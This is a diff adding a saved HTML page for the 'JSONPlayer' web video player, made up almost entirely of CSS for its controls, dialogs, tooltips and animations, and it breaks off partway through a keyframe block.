@@ -1,0 +1,4983 @@
+<!DOCTYPE html>
+<!-- saved from url=(0095)https://jx.jsonplayer.com/player/?url=https://v.qq.com/x/cover/mzc00200tl9nvn9/j0047a185to.html -->
+<html class="pc_class"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" id="viewport" name="viewport"><meta http-equiv="X-UA-Compatible" content="IE=11"><meta http-equiv="Access-Control-Allow-Origin" content="*"><meta name="referrer" content="never"><title>JSONPlayer播放器 - 基于JSON接口, 支持弹幕, 自定义广告, 加密, 防盗等</title><link rel="dns-prefetch" href="https://storage-cdn.oray.com/"><link rel="dns-prefetch" href="https://cdn.staticfile.org/"><link rel="shortcut icon" href="https://m4a.inke.cn/MTcwMTY4ODY1MjA0OSM1NTAjcG5n.png" type="image/x-icon" id="favicon"><link rel="stylesheet" href="./layer.css" id="layuicss-layer"></head>
+    <script src="./MTAyNDkzMg==_bmltYV8xNDc1ODUzMjA4NjFfMTcwMTY5Mjk3MTU2N19lYTc1ODk0YS03YmEwLTQwYWUtYTFkNS04Mzc4MDU2OGVhMjA=" type="text/javascript"></script><style type="text/css">        body, html {
+            width: 100%;
+            height: 100%;
+            padding: 0;
+            margin: 0;
+            overflow-x: hidden;
+            overflow-y: hidden;
+            text-align:center;
+            background:#181818;
+        }
+        .yzmplayer-full-icon span,
+        .yzmplayer-fulloff-icon span {
+            background-size: contain !important;
+            float: left;
+            width: 22px; 
+            height: 22px;
+        }
+        
+        .errH1{
+            width:100%;
+            height: 100%;
+            color:#FFFFFF;
+            background-color: #000;
+            text-align:center; 
+            font-family: Microsoft Jhenghei;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font: 1.7rem "Microsoft YaHei", Arial, Lucida Grande, Tahoma, sans-serif;
+        }
+
+        #loading-box {
+            background: #181818;
+        }
+        
+        #my-loading{
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            left: 0;
+            top: 0;
+            z-index: 99999;
+            background-color:#000;
+        }
+        
+        .loading .pic{
+            background-size: 100%;
+            top: 50%;
+            left: 50%;
+            transform: translate3d(-50%,-50%,0px);
+            margin: 0 !important;
+            opacity: 0;
+            transition: opacity 1s ease-in;
+        }
+        
+        #vod-title {
+            overflow: unset;
+            width: 285px;
+            white-space: normal;
+            color: #fb7299;
+        }
+
+        #vod-title e {
+            padding: 2px;
+        }
+
+        .layui-layer-dialog {
+            text-align: center;
+            font-size: 16px;
+            padding-bottom: 10px;
+        }
+
+        .layui-layer-btn.layui-layer-btn- {
+            padding: 15px 5px !important;
+            text-align: center;
+        }
+
+        .layui-layer-btn a {
+            font-size: 12px;
+            padding: 0 11px !important;
+        }
+
+        .layui-layer-btn a:hover {
+            border-color: #00a1d6 !important;
+            background-color: #00a1d6 !important;
+            color: #fff !important;
+        }
+
+        .yzmplayer-controller .yzmplayer-icons .yzmplayer-toggle input+label.checked:after {
+            left: 17px;
+        }
+
+        .yzmplayer-setting-jlast:hover #jumptime,
+        .yzmplayer-setting-jfrist:hover #fristtime {
+            display: block;
+            outline-style: none
+        }
+
+        #player_pause .tip {
+            color: #f4f4f4;
+            position: absolute;
+            font-size: 14px;
+            background-color: hsla(0, 0%, 0%, 0.42);
+            padding: 2px 4px;
+            margin: 4px;
+            border-radius: 3px;
+            right: 0;
+        }
+
+        #player_pause {
+            position: absolute;
+            z-index: 9999;
+            top: 50%;
+            left: 50%;
+            border-radius: 5px;
+            -webkit-transform: translate(-50%, -50%);
+            -moz-transform: translate(-50%, -50%);
+            transform: translate(-50%, -50%);
+            max-width: 80%;
+            max-height: 80%;
+        }
+
+        #player_pause img {
+            width: 100%;
+            height: 100%;
+        }
+
+        #jumptime::-webkit-input-placeholder,
+        #fristtime::-webkit-input-placeholder {
+            color: #ddd;
+            opacity: .5;
+            border: 0;
+        }
+
+        #jumptime::-moz-placeholder {
+            color: #ddd;
+        }
+
+        #jumptime:-ms-input-placeholder {
+            color: #ddd;
+        }
+
+        #jumptime,
+        #fristtime {
+            width: 50px;
+            border: 0;
+            background-color: #414141;
+            font-size: 12px;
+            padding: 3px 3px 3px 3px;
+            margin: 2px;
+            border-radius: 12px;
+            color: #fff;
+            /*position: absolute;*/
+            /*left: 5px;*/
+            /*top: 3px;*/
+            display: none;
+            text-align: center;
+        }
+
+        #link {
+            display: inline-block;
+            width: 100px;
+            height: 35px;
+            line-height: 35px;
+            text-align: center;
+            font-size: 14px;
+            border-radius: 22px;
+            margin: 0px 10px;
+            color: #fff;
+            overflow: hidden;
+            box-shadow: 0px 2px 3px rgba(0, 0, 0, .3);
+            background: rgb(0, 161, 214);
+            position: absolute;
+            z-index: 9999;
+            top: 20px;
+            right: 35px;
+        }
+
+        #close c {
+            float: left;
+            display: none;
+        }
+
+        .dmlink,
+        .playlink,
+        .palycon {  
+            float: left;
+            width: 400px;
+        }
+
+        #link3-error {
+            display: none;
+        }
+        
+        #video{
+            width: 100%;
+            height: 100vh;
+        }
+        
+        .mb_class .errH1{
+            font-size: 0.7rem;
+        }
+        
+.range-slider {
+	margin: 0 10px;
+}
+.range-slider-track {
+	width: inherit;
+	height: 15px;
+	margin: 0 auto;
+	position: relative;
+	cursor: e-resize;
+}
+.range-slider-track: before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 7px;
+	left: 0;
+	width: 100%;
+	height: 2px;
+	background-color: #000;
+}
+.range-slider-track .dragger {
+	display: block;
+	width: 15px;
+	height: inherit;
+	border-radius: 15px;
+	position: relative;
+	z-index: 2;
+	background-color: #00a1d6;
+	cursor: inherit;
+}
+.range-slider-vertical {
+	display: inline-block;
+	vertical-align: middle;
+	margin: 5px 10px 5px 0;
+}
+.range-slider-vertical .range-slider-track {
+	cursor: n-resize;
+	width: 20px;
+	height: 100px;
+}
+.range-slider-vertical .range-slider-track: before {
+	top: 0;
+	right: auto;
+	left: 9px;
+	width: 2px;
+	height: 100%;
+}
+.range-slider-vertical .range-slider-track .dragger {
+	width: inherit;
+	height: 10px;
+}
+.range-slider-track-actived {
+	width: inherit;
+	height: 2px;
+	background-color: #00a1d6;
+	display: block;
+	position: absolute;
+	top: 50%;
+	transform: translateY(-50%);
+}
+
+.layui-layer {
+    background-color: rgba(33,33,33,.9) !important;
+}
+
+.layui-layer-dialog{
+    min-width: 400px !important;
+}
+
+.layui-layer-title{
+    padding: 0 20px 0 20px !important;
+    height: 32px;
+    line-height: 32px;
+    font-size: 16px!important;
+    border-bottom: none !important;
+    color: #fff !important;
+    overflow: hidden;
+    background-color: rgba(33,33,33,.9) !important;
+    border-radius: 6px 6px 0 0 !important;
+    border-bottom: 1px solid hsla(0,0%,100%,.12)!important;
+}
+
+.layui-layer-setwin{
+    top: 8px !important;
+}
+
+.layui-layer-btn a{
+    color: #fff !important;
+    width: 64px;
+    border: 1px solid #4c4c4c !important;
+}
+
+.layui-layer-btn a:hover{
+    color: #fff !important;
+    border: 1px solid #4c4c4c !important;
+}
+.layui-layer-ico {
+    background: url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgc3R5bGU9IndpZHRoOiAxZW07aGVpZ2h0OiAxZW07dmVydGljYWwtYWxpZ246IG1pZGRsZTtmaWxsOiBjdXJyZW50Q29sb3I7b3ZlcmZsb3c6IGhpZGRlbjsiIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiBwLWlkPSI3NDc1Ij48cGF0aCBkPSJNODE1Ljk4MTcxNCAyMDQuMjg4YTczLjY1NDg1NyA3My42NTQ4NTcgMCAwIDEgMCAxMDMuOTM2bC01MDguMjY5NzE0IDUwOS45NTJhNzMuMTQyODU3IDczLjE0Mjg1NyAwIDAgMS0xMDMuNDI0IDAgNzMuNjU0ODU3IDczLjY1NDg1NyAwIDAgMSAwLTEwMy45MzZsNTA4LjI2OTcxNC01MDkuOTUyYTczLjE0Mjg1NyA3My4xNDI4NTcgMCAwIDEgMTAzLjQyNCAweiIgZmlsbD0iI2ZmZmZmZiIgcC1pZD0iNzQ3NiI+PC9wYXRoPjxwYXRoIGQ9Ik04MTkuNjM4ODU3IDgxOC4xNzZhNzMuNTgxNzE0IDczLjU4MTcxNCAwIDAgMS0xMDMuOTM2IDBMMjA1Ljc1MDg1NyAzMDguMDc3NzE0YTczLjQzNTQyOSA3My40MzU0MjkgMCAwIDEgMTAzLjkzNi0xMDMuNzg5NzE0bDUwOS45NTIgNTEwLjA5ODI4NmE3My4xNDI4NTcgNzMuMTQyODU3IDAgMCAxIDAgMTAzLjc4OTcxNHoiIGZpbGw9IiNmZmZmZmYiIHAtaWQ9Ijc0NzciPjwvcGF0aD48L3N2Zz4=)!important;
+}
+.yzmplayer-color-popup {
+    color: #fff!important;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track .dragger{
+    width: 11px;
+    height: 11px;
+    border-radius: 11px;
+    top: 3.5px;
+    cursor: pointer;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track{
+    height: inherit !important;
+    cursor: inherit;
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track:before{
+    height: 3px !important;
+    background-color: #fff;
+    top: 50%;
+    transform: translateY(-50%);
+}
+
+.yzmplayer-setting-danmaku-proportion .range-slider-track-actived{
+    height: 3px !important;
+}
+
+.mb_class .yzmplayer-setting-danmaku-proportion .range-slider-track .dragger{
+    top: 4.5px;
+}
+
+</style><script src="./jquery.min.js.下载" type="text/javascript"></script><script src="./MTAyNDkzMg==_bmltYV8xNDc1ODUzMjA4NjFfMTcwMTY5MjQ4OTU4Ml85NDU4OWVkNy0zNWVkLTRlMjEtYmJjYy1kZmM5ZDZiMjk5NWQ=" type="text/javascript"></script><style type="text/css">@font-face {
+	font-family: 'yzmfont';
+	src: url('https://vkceyugu.cdn.bspapp.com/VKCEYUGU-f1aaee17-daff-4da7-8870-4e7076225fa2/18158300-e4e2-424f-bc38-3df8bb529e51.ttf');
+}
+
+button[data-balloon] {
+	overflow: visible;
+}
+
+[data-balloon] {
+	position: relative;
+	cursor: pointer;
+}
+
+[data-balloon]:after {
+	font-family: sans-serif !important;
+	font-weight: 400 !important;
+	font-style: normal !important;
+	text-shadow: none !important;
+	font-size: 12px !important;
+	background: hsla(0, 0%, 7%, .9);
+	border-radius: 4px;
+	color: #fff;
+	content: attr(data-balloon);
+	padding: .5em 1em;
+	white-space: nowrap;
+}
+
+[data-balloon]:after,
+[data-balloon]:before {
+	filter: alpha(opactiy=0);
+	-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";
+	-moz-opacity: 0;
+	-khtml-opacity: 0;
+	opacity: 0;
+	pointer-events: none;
+	-webkit-transition: all .18s ease-out .18s;
+	transition: all .18s ease-out .18s;
+	position: absolute;
+	z-index: 10;
+}
+
+[data-balloon]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='12'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M2.658 0h32.004c-6 0-11.627 12.002-16.002 12.002C14.285 12.002 8.594 0 2.658 0z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 18px;
+	height: 6px;
+	content: "";
+}
+
+[data-balloon]:hover:after,
+[data-balloon]:hover:before,
+[data-balloon][data-balloon-visible]:after,
+[data-balloon][data-balloon-visible]:before {
+	filter: alpha(opactiy=100);
+	-ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";
+	-moz-opacity: 1;
+	-khtml-opacity: 1;
+	opacity: 1;
+	pointer-events: auto;
+}
+
+[data-balloon].font-awesome:after {
+	font-family: FontAwesome;
+}
+
+[data-balloon][data-balloon-break]:after {
+	white-space: pre;
+}
+
+[data-balloon][data-balloon-blunt]:after,
+[data-balloon][data-balloon-blunt]:before {
+	-webkit-transition: none;
+	transition: none;
+}
+
+[data-balloon][data-balloon-pos=up]:after {
+	margin-bottom: 11px;
+}
+
+[data-balloon][data-balloon-pos=up]:after,
+[data-balloon][data-balloon-pos=up]:before {
+	bottom: 100%;
+	left: 50%;
+	-webkit-transform: translate(-50%, 10px);
+	transform: translate(-50%, 10px);
+	-webkit-transform-origin: top;
+	transform-origin: top;
+}
+
+[data-balloon][data-balloon-pos=up]:before {
+	margin-bottom: 5px;
+}
+
+[data-balloon][data-balloon-pos=up]:hover:after,
+[data-balloon][data-balloon-pos=up]:hover:before,
+[data-balloon][data-balloon-pos=up][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=up][data-balloon-visible]:before {
+	-webkit-transform: translate(-50%);
+	transform: translate(-50%);
+}
+
+[data-balloon][data-balloon-pos=up-left]:after {
+	left: 0;
+	margin-bottom: 11px;
+}
+
+[data-balloon][data-balloon-pos=up-left]:after,
+[data-balloon][data-balloon-pos=up-left]:before {
+	bottom: 100%;
+	-webkit-transform: translateY(10px);
+	transform: translateY(10px);
+	-webkit-transform-origin: top;
+	transform-origin: top;
+}
+
+[data-balloon][data-balloon-pos=up-left]:before {
+	left: 5px;
+	margin-bottom: 5px;
+}
+
+[data-balloon][data-balloon-pos=up-left]:hover:after,
+[data-balloon][data-balloon-pos=up-left]:hover:before,
+[data-balloon][data-balloon-pos=up-left][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=up-left][data-balloon-visible]:before {
+	-webkit-transform: translate(0);
+	transform: translate(0);
+}
+
+[data-balloon][data-balloon-pos=up-right]:after {
+	right: 0;
+	margin-bottom: 11px;
+}
+
+[data-balloon][data-balloon-pos=up-right]:after,
+[data-balloon][data-balloon-pos=up-right]:before {
+	bottom: 100%;
+	-webkit-transform: translateY(10px);
+	transform: translateY(10px);
+	-webkit-transform-origin: top;
+	transform-origin: top;
+}
+
+[data-balloon][data-balloon-pos=up-right]:before {
+	right: 5px;
+	margin-bottom: 5px;
+}
+
+[data-balloon][data-balloon-pos=up-right]:hover:after,
+[data-balloon][data-balloon-pos=up-right]:hover:before,
+[data-balloon][data-balloon-pos=up-right][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=up-right][data-balloon-visible]:before {
+	-webkit-transform: translate(0);
+	transform: translate(0);
+}
+
+[data-balloon][data-balloon-pos=down]:after {
+	margin-top: 11px;
+}
+
+[data-balloon][data-balloon-pos=down]:after,
+[data-balloon][data-balloon-pos=down]:before {
+	left: 50%;
+	top: 100%;
+	-webkit-transform: translate(-50%, -10px);
+	transform: translate(-50%, -10px);
+}
+
+[data-balloon][data-balloon-pos=down]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='12'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M33.342 12H1.338c6 0 11.627-12.002 16.002-12.002C21.715-.002 27.406 12 33.342 12z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 18px;
+	height: 6px;
+	margin-top: 5px;
+}
+
+[data-balloon][data-balloon-pos=down]:hover:after,
+[data-balloon][data-balloon-pos=down]:hover:before,
+[data-balloon][data-balloon-pos=down][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=down][data-balloon-visible]:before {
+	-webkit-transform: translate(-50%);
+	transform: translate(-50%);
+}
+
+[data-balloon][data-balloon-pos=down-left]:after {
+	left: 0;
+	margin-top: 11px;
+	top: 100%;
+	-webkit-transform: translateY(-10px);
+	transform: translateY(-10px);
+}
+
+[data-balloon][data-balloon-pos=down-left]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='12'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M33.342 12H1.338c6 0 11.627-12.002 16.002-12.002C21.715-.002 27.406 12 33.342 12z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 18px;
+	height: 6px;
+	left: 5px;
+	margin-top: 5px;
+	top: 100%;
+	-webkit-transform: translateY(-10px);
+	transform: translateY(-10px);
+}
+
+[data-balloon][data-balloon-pos=down-left]:hover:after,
+[data-balloon][data-balloon-pos=down-left]:hover:before,
+[data-balloon][data-balloon-pos=down-left][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=down-left][data-balloon-visible]:before {
+	-webkit-transform: translate(0);
+	transform: translate(0);
+}
+
+[data-balloon][data-balloon-pos=down-right]:after {
+	right: 0;
+	margin-top: 11px;
+	top: 100%;
+	-webkit-transform: translateY(-10px);
+	transform: translateY(-10px);
+}
+
+[data-balloon][data-balloon-pos=down-right]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='36' height='12'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M33.342 12H1.338c6 0 11.627-12.002 16.002-12.002C21.715-.002 27.406 12 33.342 12z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 18px;
+	height: 6px;
+	right: 5px;
+	margin-top: 5px;
+	top: 100%;
+	-webkit-transform: translateY(-10px);
+	transform: translateY(-10px);
+}
+
+[data-balloon][data-balloon-pos=down-right]:hover:after,
+[data-balloon][data-balloon-pos=down-right]:hover:before,
+[data-balloon][data-balloon-pos=down-right][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=down-right][data-balloon-visible]:before {
+	-webkit-transform: translate(0);
+	transform: translate(0);
+}
+
+[data-balloon][data-balloon-pos=left]:after {
+	margin-right: 11px;
+	right: 100%;
+	top: 50%;
+	-webkit-transform: translate(10px, -50%);
+	transform: translate(10px, -50%);
+}
+
+[data-balloon][data-balloon-pos=left]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='36'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M0 33.342V1.338c0 6 12.002 11.627 12.002 16.002C12.002 21.715 0 27.406 0 33.342z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 6px;
+	height: 18px;
+	margin-right: 5px;
+	right: 100%;
+	top: 50%;
+	-webkit-transform: translate(10px, -50%);
+	transform: translate(10px, -50%);
+}
+
+[data-balloon][data-balloon-pos=left]:hover:after,
+[data-balloon][data-balloon-pos=left]:hover:before,
+[data-balloon][data-balloon-pos=left][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=left][data-balloon-visible]:before {
+	-webkit-transform: translateY(-50%);
+	transform: translateY(-50%);
+}
+
+[data-balloon][data-balloon-pos=right]:after {
+	left: 100%;
+	margin-left: 11px;
+	top: 50%;
+	-webkit-transform: translate(-10px, -50%);
+	transform: translate(-10px, -50%);
+}
+
+[data-balloon][data-balloon-pos=right]:before {
+	background: no-repeat url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='36'%3E%3Cpath fill='rgba(17, 17, 17, 0.9)' d='M12 2.658v32.004c0-6-12.002-11.627-12.002-16.002C-.002 14.285 12 8.594 12 2.658z'/%3E%3C/svg%3E");
+	background-size: 100% auto;
+	width: 6px;
+	height: 18px;
+	left: 100%;
+	margin-left: 5px;
+	top: 50%;
+	-webkit-transform: translate(-10px, -50%);
+	transform: translate(-10px, -50%);
+}
+
+[data-balloon][data-balloon-pos=right]:hover:after,
+[data-balloon][data-balloon-pos=right]:hover:before,
+[data-balloon][data-balloon-pos=right][data-balloon-visible]:after,
+[data-balloon][data-balloon-pos=right][data-balloon-visible]:before {
+	-webkit-transform: translateY(-50%);
+	transform: translateY(-50%);
+}
+
+[data-balloon][data-balloon-length=small]:after {
+	white-space: normal;
+	width: 80px;
+}
+
+[data-balloon][data-balloon-length=medium]:after {
+	white-space: normal;
+	width: 150px;
+}
+
+[data-balloon][data-balloon-length=large]:after {
+	white-space: normal;
+	width: 260px;
+}
+
+[data-balloon][data-balloon-length=xlarge]:after {
+	white-space: normal;
+	width: 380px;
+}
+
+@media screen and (max-width:768px) {
+	[data-balloon][data-balloon-length=xlarge]:after {
+		white-space: normal;
+		width: 90vw;
+	}
+}
+
+[data-balloon][data-balloon-length=fit]:after {
+	white-space: normal;
+	width: 100%;
+}
+
+@-webkit-keyframes my-face {
+	2% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	4% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	6% {
+		-webkit-transform: translateY(1.5px) rotate(-1.5deg);
+		transform: translateY(1.5px) rotate(-1.5deg);
+	}
+
+	8% {
+		-webkit-transform: translateY(-1.5px) rotate(-1.5deg);
+		transform: translateY(-1.5px) rotate(-1.5deg);
+	}
+
+	10% {
+		-webkit-transform: translateY(2.5px) rotate(1.5deg);
+		transform: translateY(2.5px) rotate(1.5deg);
+	}
+
+	12% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	14% {
+		-webkit-transform: translateY(-1.5px) rotate(1.5deg);
+		transform: translateY(-1.5px) rotate(1.5deg);
+	}
+
+	16% {
+		-webkit-transform: translateY(-.5px) rotate(-1.5deg);
+		transform: translateY(-.5px) rotate(-1.5deg);
+	}
+
+	18% {
+		-webkit-transform: translateY(.5px) rotate(-1.5deg);
+		transform: translateY(.5px) rotate(-1.5deg);
+	}
+
+	20% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	22% {
+		-webkit-transform: translateY(.5px) rotate(-1.5deg);
+		transform: translateY(.5px) rotate(-1.5deg);
+	}
+
+	24% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	26% {
+		-webkit-transform: translateY(.5px) rotate(.5deg);
+		transform: translateY(.5px) rotate(.5deg);
+	}
+
+	28% {
+		-webkit-transform: translateY(.5px) rotate(1.5deg);
+		transform: translateY(.5px) rotate(1.5deg);
+	}
+
+	30% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	32% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	34% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	36% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	38% {
+		-webkit-transform: translateY(1.5px) rotate(-1.5deg);
+		transform: translateY(1.5px) rotate(-1.5deg);
+	}
+
+	40% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	42% {
+		-webkit-transform: translateY(2.5px) rotate(-1.5deg);
+		transform: translateY(2.5px) rotate(-1.5deg);
+	}
+
+	44% {
+		-webkit-transform: translateY(1.5px) rotate(.5deg);
+		transform: translateY(1.5px) rotate(.5deg);
+	}
+
+	46% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	48% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	50% {
+		-webkit-transform: translateY(.5px) rotate(.5deg);
+		transform: translateY(.5px) rotate(.5deg);
+	}
+
+	52% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	54% {
+		-webkit-transform: translateY(-1.5px) rotate(1.5deg);
+		transform: translateY(-1.5px) rotate(1.5deg);
+	}
+
+	56% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	58% {
+		-webkit-transform: translateY(.5px) rotate(2.5deg);
+		transform: translateY(.5px) rotate(2.5deg);
+	}
+
+	60% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	62% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	64% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	66% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	68% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	70% {
+		-webkit-transform: translateY(1.5px) rotate(.5deg);
+		transform: translateY(1.5px) rotate(.5deg);
+	}
+
+	72% {
+		-webkit-transform: translateY(2.5px) rotate(1.5deg);
+		transform: translateY(2.5px) rotate(1.5deg);
+	}
+
+	74% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	76% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	78% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	80% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	82% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	84% {
+		-webkit-transform: translateY(1.5px) rotate(2.5deg);
+		transform: translateY(1.5px) rotate(2.5deg);
+	}
+
+	86% {
+		-webkit-transform: translateY(-1.5px) rotate(-1.5deg);
+		transform: translateY(-1.5px) rotate(-1.5deg);
+	}
+
+	88% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	90% {
+		-webkit-transform: translateY(2.5px) rotate(-.5deg);
+		transform: translateY(2.5px) rotate(-.5deg);
+	}
+
+	92% {
+		-webkit-transform: translateY(.5px) rotate(-.5deg);
+		transform: translateY(.5px) rotate(-.5deg);
+	}
+
+	94% {
+		-webkit-transform: translateY(2.5px) rotate(.5deg);
+		transform: translateY(2.5px) rotate(.5deg);
+	}
+
+	96% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	98% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	0%,
+	to {
+		-webkit-transform: translate(0) rotate(0deg);
+		transform: translate(0) rotate(0deg);
+	}
+}
+
+@keyframes my-face {
+	2% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	4% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	6% {
+		-webkit-transform: translateY(1.5px) rotate(-1.5deg);
+		transform: translateY(1.5px) rotate(-1.5deg);
+	}
+
+	8% {
+		-webkit-transform: translateY(-1.5px) rotate(-1.5deg);
+		transform: translateY(-1.5px) rotate(-1.5deg);
+	}
+
+	10% {
+		-webkit-transform: translateY(2.5px) rotate(1.5deg);
+		transform: translateY(2.5px) rotate(1.5deg);
+	}
+
+	12% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	14% {
+		-webkit-transform: translateY(-1.5px) rotate(1.5deg);
+		transform: translateY(-1.5px) rotate(1.5deg);
+	}
+
+	16% {
+		-webkit-transform: translateY(-.5px) rotate(-1.5deg);
+		transform: translateY(-.5px) rotate(-1.5deg);
+	}
+
+	18% {
+		-webkit-transform: translateY(.5px) rotate(-1.5deg);
+		transform: translateY(.5px) rotate(-1.5deg);
+	}
+
+	20% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	22% {
+		-webkit-transform: translateY(.5px) rotate(-1.5deg);
+		transform: translateY(.5px) rotate(-1.5deg);
+	}
+
+	24% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	26% {
+		-webkit-transform: translateY(.5px) rotate(.5deg);
+		transform: translateY(.5px) rotate(.5deg);
+	}
+
+	28% {
+		-webkit-transform: translateY(.5px) rotate(1.5deg);
+		transform: translateY(.5px) rotate(1.5deg);
+	}
+
+	30% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	32% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	34% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	36% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	38% {
+		-webkit-transform: translateY(1.5px) rotate(-1.5deg);
+		transform: translateY(1.5px) rotate(-1.5deg);
+	}
+
+	40% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	42% {
+		-webkit-transform: translateY(2.5px) rotate(-1.5deg);
+		transform: translateY(2.5px) rotate(-1.5deg);
+	}
+
+	44% {
